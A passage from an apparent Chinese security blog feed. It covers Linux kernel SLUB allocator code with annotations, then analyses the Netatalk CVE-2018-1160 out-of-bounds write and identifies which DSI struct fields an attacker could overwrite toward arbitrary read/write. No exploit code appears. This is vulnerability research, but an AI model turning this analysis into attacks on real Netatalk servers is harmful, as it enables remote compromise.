flags);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">slab_empty:</span><br><span class="line"><span class="comment">//slab完全空闲且n-&gt;nr_partial大于等于下限min_partial,先移除再销毁</span></span><br><span class="line"><span class="keyword">if</span> (prior) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Slab on the partial list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">remove_partial(n, slab);</span><br><span class="line">stat(s, FREE_REMOVE_PARTIAL);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="comment">/* Slab must be on the full list */</span></span><br><span class="line">remove_full(s, n, slab);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">stat(s, FREE_SLAB);</span><br><span class="line">discard_slab(s, slab);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 将刚刚冻结的slab移动到keme_cache_cpu-&gt;partial中</span></span><br><span class="line"><span class="comment"> * 若已满则将旧的partial链表(old_slab)解冻并放到kmem_cache_node</span></span><br><span class="line"><span class="comment"> * 中或销毁</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">put_cpu_partial</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> slab *slab, <span class="type">int</span> drain)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">oldslab</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab_to_unfreeze</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"><span class="type">int</span> slabs = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line">oldslab = this_cpu_read(s-&gt;cpu_slab-&gt;partial);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (oldslab) {</span><br><span class="line"><span class="keyword">if</span> (drain &amp;&amp; oldslab-&gt;slabs &gt;= s-&gt;cpu_partial_slabs) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Partial array is full. Move the existing set to the</span></span><br><span class="line"><span class="comment"> * per node partial list. Postpone the actual unfreezing</span></span><br><span class="line"><span class="comment"> * outside of the critical section.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//如果kmem_cache_node中slabs已经超过cpu_partial_slabs,</span></span><br><span class="line"><span class="comment">//则使用slab替换old_slab,解冻old_slab并移动到</span></span><br><span class="line"><span class="comment">//kmem_cache_node-&gt;partial.注意这里的slab_to_unfreeze</span></span><br><span class="line"><span class="comment">//是一个链表</span></span><br><span class="line">slab_to_unfreeze = oldslab;</span><br><span class="line">oldslab = <span class="literal">NULL</span>;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">slabs = oldslab-&gt;slabs;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">slabs++;</span><br><span class="line"></span><br><span class="line"><span class="comment">//slab插入到oldslab之前(这里oldslab可能为空)</span></span><br><span class="line">slab-&gt;slabs = slabs;</span><br><span class="line">slab-&gt;next = oldslab;</span><br><span class="line"></span><br><span class="line"><span class="comment">//slab移动到kmem_cache_cpu-&gt;partial中</span></span><br><span class="line">this_cpu_write(s-&gt;cpu_slab-&gt;partial, slab);</span><br><span class="line"></span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slab_to_unfreeze) {</span><br><span class="line"><span class="comment">//解冻slab_to_unfreeze并移动到</span></span><br><span class="line"><span class="comment">//kmem_cache_node-&gt;partial或销毁.</span></span><br><span class="line"><span class="comment">//注意这里的slab_to_unfreeze是一个链表</span></span><br><span class="line">__unfreeze_partials(s, slab_to_unfreeze);</span><br><span class="line">stat(s, CPU_PARTIAL_DRAIN);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//解冻partial_slab并移动到</span></span><br><span class="line"><span class="comment">//kmem_cache_node-&gt;partial或销毁.</span></span><br><span class="line"><span class="comment">//注意这里的partial_slab是一个链表</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __unfreeze_partials(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> slab *partial_slab)</span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> <span class="literal">NULL</span>, *n2 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>, *<span class="title">slab_to_discard</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (partial_slab) {</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> <span class="title">new</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> <span class="title">old</span>;</span></span><br><span class="line"></span><br><span class="line">slab = partial_slab;</span><br><span class="line">partial_slab = slab-&gt;next;</span><br><span class="line"></span><br><span class="line">n2 = get_node(s, slab_nid(slab));</span><br><span class="line"><span class="keyword">if</span> (n != n2) {</span><br><span class="line"><span class="keyword">if</span> (n)</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line">n = n2;</span><br><span class="line">spin_lock_irqsave(&amp;n-&gt;list_lock, flags);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> {</span><br><span class="line"></span><br><span class="line">old.freelist = slab-&gt;freelist;</span><br><span class="line">old.counters = slab-&gt;counters;</span><br><span class="line">VM_BUG_ON(!old.frozen);</span><br><span class="line"></span><br><span class="line">new.counters = old.counters;</span><br><span class="line">new.freelist = old.freelist;</span><br><span class="line"></span><br><span class="line">new.frozen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">} <span class="keyword">while</span> (!__slab_update_freelist(s, slab,</span><br><span class="line">old.freelist, old.counters,</span><br><span class="line">new.freelist, new.counters,</span><br><span class="line"><span class="string">"unfreezing slab"</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial)) {</span><br><span class="line"><span class="comment">//如果该slab完全空闲且当前节点的nr_partial超过了下限min_partial</span></span><br><span class="line"><span class="comment">//则销毁该slab</span></span><br><span class="line">slab-&gt;next = slab_to_discard;</span><br><span class="line">slab_to_discard = slab;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="comment">//否则加入到kmem_cache_node-&gt;partial中.</span></span><br><span class="line"><span class="comment">//注意这里的标志DEACTIVATE_TO_TAIL,即插入到末尾</span></span><br><span class="line">add_partial(n, slab, DEACTIVATE_TO_TAIL);</span><br><span class="line">stat(s, FREE_ADD_PARTIAL);</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n)</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (slab_to_discard) {</span><br><span class="line">slab = slab_to_discard;</span><br><span class="line">slab_to_discard = slab_to_discard-&gt;next;</span><br><span class="line"></span><br><span class="line">stat(s, DEACTIVATE_EMPTY);</span><br><span class="line">discard_slab(s, slab);</span><br><span class="line">stat(s, FREE_SLAB);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>释放回底层buddy system,没啥好分析的.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">discard_slab</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> slab *slab)</span></span><br><span class="line">{</span><br><span class="line">dec_slabs_node(s, slab_nid(slab), slab-&gt;objects);</span><br><span class="line">free_slab(s, slab);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
            <tag> SLUB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-1160 Netatalk 越界写入</title>
      <link href="/2024/CVE-2018-1160%20Netatalk-OOB/"/>
      <url>/2024/CVE-2018-1160%20Netatalk-OOB/</url>
      
        <content type="html"><![CDATA[<p>“世界上最遥远的距离,是任意地址写和ASLR”</p><span id="more"></span><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先查看漏洞报告中的关键信息.</p><blockquote><p><code>Netatalk</code> before <code>3.1.12</code> is vulnerable to an <code>out of bounds write</code> in <code>dsi_opensess.c</code>. This is due to lack of bounds checking on attacker controlled data. A remote unauthenticated attacker can leverage this vulnerability to achieve arbitrary code execution. <a href="https://github.com/advisories/GHSA-j675-7hvj-qfw5">https://github.com/advisories/GHSA-j675-7hvj-qfw5</a></p></blockquote><p>搜索得知Netatalk是开源的AFP协议的文件服务器,下载源码到本地.</p><p>定位到漏洞函数dsi_opensession.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* OpenSession. set up the connection */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dsi_opensession</span><span class="params">(DSI *dsi)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">uint32_t</span> i = <span class="number">0</span>; <span class="comment">/* this serves double duty. it must be 4-bytes long */</span></span><br><span class="line">  <span class="type">int</span> offs;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (setnonblock(dsi-&gt;socket, <span class="number">1</span>) &lt; <span class="number">0</span>) {</span><br><span class="line">      LOG(log_error, logtype_dsi, <span class="string">"dsi_opensession: setnonblock: %s"</span>, strerror(errno));</span><br><span class="line">      AFP_PANIC(<span class="string">"setnonblock error"</span>);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* parse options */</span></span><br><span class="line">  <span class="keyword">while</span> (i &lt; dsi-&gt;cmdlen) {</span><br><span class="line">    <span class="keyword">switch</span> (dsi-&gt;commands[i++]) {</span><br><span class="line">    <span class="keyword">case</span> DSIOPT_ATTNQUANT:</span><br><span class="line">      <span class="built_in">memcpy</span>(&amp;dsi-&gt;attn_quantum, dsi-&gt;commands + i + <span class="number">1</span>, dsi-&gt;commands[i]);</span><br><span class="line">      dsi-&gt;attn_quantum = ntohl(dsi-&gt;attn_quantum);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DSIOPT_SERVQUANT: <span class="comment">/* just ignore these */</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      i += dsi-&gt;commands[i] + <span class="number">1</span>; <span class="comment">/* forward past length tag + length */</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* let the client know the server quantum. we don't use the</span></span><br><span class="line"><span class="comment">   * max server quantum due to a bug in appleshare client 3.8.6. */</span></span><br><span class="line">  dsi-&gt;header.dsi_flags = DSIFL_REPLY;</span><br><span class="line">  dsi-&gt;header.dsi_data.dsi_code = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* dsi-&gt;header.dsi_command = DSIFUNC_OPEN;*/</span></span><br><span class="line"></span><br><span class="line">  dsi-&gt;cmdlen = <span class="number">2</span> * (<span class="number">2</span> + <span class="keyword">sizeof</span>(i)); <span class="comment">/* length of data. dsi_send uses it. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* DSI Option Server Request Quantum */</span></span><br><span class="line">  dsi-&gt;commands[<span class="number">0</span>] = DSIOPT_SERVQUANT;</span><br><span class="line">  dsi-&gt;commands[<span class="number">1</span>] = <span class="keyword">sizeof</span>(i);</span><br><span class="line">  i = htonl(( dsi-&gt;server_quantum &lt; DSI_SERVQUANT_MIN || </span><br><span class="line">      dsi-&gt;server_quantum &gt; DSI_SERVQUANT_MAX ) ? </span><br><span class="line">    DSI_SERVQUANT_DEF : dsi-&gt;server_quantum);</span><br><span class="line">  <span class="built_in">memcpy</span>(dsi-&gt;commands + <span class="number">2</span>, &amp;i, <span class="keyword">sizeof</span>(i));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* AFP replaycache size option */</span></span><br><span class="line">  offs = <span class="number">2</span> + <span class="keyword">sizeof</span>(i);</span><br><span class="line">  dsi-&gt;commands[offs] = DSIOPT_REPLCSIZE;</span><br><span class="line">  dsi-&gt;commands[offs+<span class="number">1</span>] = <span class="keyword">sizeof</span>(i);</span><br><span class="line">  i = htonl(REPLAYCACHE_SIZE);</span><br><span class="line">  <span class="built_in">memcpy</span>(dsi-&gt;commands + offs + <span class="number">2</span>, &amp;i, <span class="keyword">sizeof</span>(i));</span><br><span class="line">  dsi_send(dsi);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>关键代码:<br>虽然没有其他信息,但从变量命名就能推断出这里明显有个溢出.<br>memcpy的第二个参数和第三个参数都来自dsi-&gt;commands,而作为一个文件服务器,推断dsi-&gt;commands是可控的.即写入的内容与大小均可控.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* parse options */</span></span><br><span class="line"><span class="keyword">while</span> (i &lt; dsi-&gt;cmdlen) {</span><br><span class="line">  <span class="keyword">switch</span> (dsi-&gt;commands[i++]) {</span><br><span class="line">  <span class="keyword">case</span> DSIOPT_ATTNQUANT:</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;dsi-&gt;attn_quantum, dsi-&gt;commands + i + <span class="number">1</span>, dsi-&gt;commands[i]);</span><br><span class="line">    dsi-&gt;attn_quantum = ntohl(dsi-&gt;attn_quantum);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> DSIOPT_SERVQUANT: <span class="comment">/* just ignore these */</span></span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    i += dsi-&gt;commands[i] + <span class="number">1</span>; <span class="comment">/* forward past length tag + length */</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>同时能看出dsi的命令格式.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x0: DSI会话选项</span><br><span class="line">0x01: 命令中数据长度</span><br><span class="line">0x02: 数据</span><br></pre></td></tr></tbody></table></figure><p>分析一下溢出对象.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* child and parent processes might interpret a couple of these</span></span><br><span class="line"><span class="comment"> * differently. */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DSI</span> {</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DSI</span> *<span class="title">next</span>;</span>             <span class="comment">/* multiple listening addresses */</span></span><br><span class="line">    AFPObj   *AFPobj;</span><br><span class="line">    <span class="type">int</span>      statuslen;</span><br><span class="line">    <span class="type">char</span>     status[<span class="number">1400</span>];</span><br><span class="line">    <span class="type">char</span>     *signature;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dsi_block</span>        <span class="title">header</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">server</span>, <span class="title">client</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">itimerval</span>        <span class="title">timer</span>;</span></span><br><span class="line">    <span class="type">int</span>      tickle;            <span class="comment">/* tickle count */</span></span><br><span class="line">    <span class="type">int</span>      in_write;          <span class="comment">/* in the middle of writing multiple packets,</span></span><br><span class="line"><span class="comment">                                   signal handlers can't write to the socket */</span></span><br><span class="line">    <span class="type">int</span>      msg_request;       <span class="comment">/* pending message to the client */</span></span><br><span class="line">    <span class="type">int</span>      down_request;      <span class="comment">/* pending SIGUSR1 down in 5 mn */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> attn_quantum, datasize, server_quantum;</span><br><span class="line">    <span class="type">uint16_t</span> serverID, clientID;</span><br><span class="line">    <span class="type">uint8_t</span>  *commands; <span class="comment">/* DSI recieve buffer */</span></span><br><span class="line">    <span class="type">uint8_t</span>  data[DSI_DATASIZ];    <span class="comment">/* DSI reply buffer */</span></span><br><span class="line">    <span class="type">size_t</span>   datalen, cmdlen;</span><br><span class="line">    <span class="type">off_t</span>    read_count, write_count;</span><br><span class="line">    <span class="type">uint32_t</span> flags;             <span class="comment">/* DSI flags like DSI_SLEEPING, DSI_DISCONNECTED */</span></span><br><span class="line">    <span class="type">int</span>      socket;            <span class="comment">/* AFP session socket */</span></span><br><span class="line">    <span class="type">int</span>      serversock;        <span class="comment">/* listening socket */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* DSI readahead buffer used for buffered reads in dsi_peek */</span></span><br><span class="line">    <span class="type">size_t</span>   dsireadbuf;        <span class="comment">/* size of the DSI readahead buffer used in dsi_peek() */</span></span><br><span class="line">    <span class="type">char</span>     *buffer;           <span class="comment">/* buffer start */</span></span><br><span class="line">    <span class="type">char</span>     *start;            <span class="comment">/* current buffer head */</span></span><br><span class="line">    <span class="type">char</span>     *eof;              <span class="comment">/* end of currently used buffer */</span></span><br><span class="line">    <span class="type">char</span>     *end;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> USE_ZEROCONF</span></span><br><span class="line">    <span class="type">char</span> *bonjourname;      <span class="comment">/* server name as UTF8 maxlen MAXINSTANCENAMELEN */</span></span><br><span class="line">    <span class="type">int</span> zeroconf_registered;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* protocol specific open/close, send/receive</span></span><br><span class="line"><span class="comment">     * send/receive fill in the header and use dsi-&gt;commands.</span></span><br><span class="line"><span class="comment">     * write/read just write/read data */</span></span><br><span class="line">    <span class="type">pid_t</span>  (*proto_open)(<span class="keyword">struct</span> DSI *);</span><br><span class="line">    <span class="type">void</span>   (*proto_close)(<span class="keyword">struct</span> DSI *);</span><br><span class="line">} DSI;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>由于表示数据长度的空间只有1字节,所以最大写入长度为0xff,所以能溢出的成员变量为:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> attn_quantum, datasize, server_quantum;</span><br><span class="line"><span class="type">uint16_t</span> serverID, clientID;</span><br><span class="line"><span class="type">uint8_t</span>  *commands; <span class="comment">/* DSI recieve buffer */</span></span><br><span class="line"><span class="type">uint8_t</span>  data[DSI_DATASIZ];    <span class="comment">/* DSI reply buffer */</span></span><br></pre></td></tr></tbody></table></figure><p>从变量名初步判断,覆盖datasize或server_quantum( The server acknowledges the request and returns the size of its data receive buffer)可能可以造成一个越界读写,覆盖commands指针可能能造成一个任意读写.</p><p>查一下交叉引用,稍微分析一下程序的流程.发现整个程序都与DSI有关,于是查询DSI的相关信息.关键词: DSI AFP.</p><blockquote><p>The Data Stream Interface (DSI) is a session layer used to carry Apple Filing Protocol traffic over Transmission Control Protocol.</p></blockquote><blockquote><p>A session is set up by the client sending a DSIOpenSession, which will include the size of the receive buffer the client has for packets (called the request quantum, typically 1024 bytes). The server acknowledges the request and returns the size of its data receive buffer (typically 256k on Mac OS X Leopard).</p></blockquote><blockquote><p>Session closure can be initiated by either side by sending DSICloseSession. The sender does not need to wait for a reply and should immediately close the session after sending the message.</p></blockquote><blockquote><p>Maintaining the connection is done by tickling. DSI provides a mechanism for ensuring that client and server know that the other is still active. Every 30 seconds of inactivity, the server sends a tickle request to the client. Similarly, the client also sends its own tickle. (This is NOT a response packet.) Either the client or server can terminate the DSI session if they fail to hear from the other for 120 seconds. The client may also disconnect if a request is in flight and neither a response nor tickle is received within 60 seconds (in Mac OS X v.10.2 and later).</p></blockquote><p>嘶,这格式怎么和之前分析的不一样啊…..<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202401271739423.png"></p><p>查看dsi-&gt;command的交叉引用,找到这样一条调用链:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">main</span><br><span class="line">    -&gt;afp_over_dsi</span><br><span class="line">        -&gt;dsi_stream_receive</span><br></pre></td></tr></tbody></table></figure><p>最后的dsi_stream_receive函数便是解析输入的地方.<br>稍微分析一下,解决之前协议格式的疑问:我之前推出的格式是DSIOpenSession的payload部分的格式.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * Read DSI command and data</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param  dsi   (rw) DSI handle</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @return    DSI function on success, 0 on failure</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dsi_stream_receive</span><span class="params">(DSI *dsi)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> block[DSI_BLOCKSIZ];</span><br><span class="line"></span><br><span class="line">  LOG(log_maxdebug, logtype_dsi, <span class="string">"dsi_stream_receive: START"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;flags &amp; DSI_DISCONNECTED)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* read in the header */</span></span><br><span class="line">  <span class="keyword">if</span> (dsi_buffered_stream_read(dsi, (<span class="type">uint8_t</span> *)block, <span class="keyword">sizeof</span>(block)) != <span class="keyword">sizeof</span>(block)) </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  dsi-&gt;header.dsi_flags = block[<span class="number">0</span>];</span><br><span class="line">  dsi-&gt;header.dsi_command = block[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dsi-&gt;header.dsi_command == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span 